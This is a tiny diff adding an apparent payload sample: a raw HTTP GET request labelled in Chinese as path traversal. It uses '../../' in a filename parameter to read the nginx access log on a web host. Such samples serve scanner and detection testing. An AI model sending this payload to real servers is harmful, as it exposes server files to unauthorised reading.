@@ -1,0 +1,5 @@
+#[路径穿越]nginx/access.log
+GET /?filename=../../var/log/nginx/access.log HTTP/1.1
+Host: www.pqbhttp.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36
+
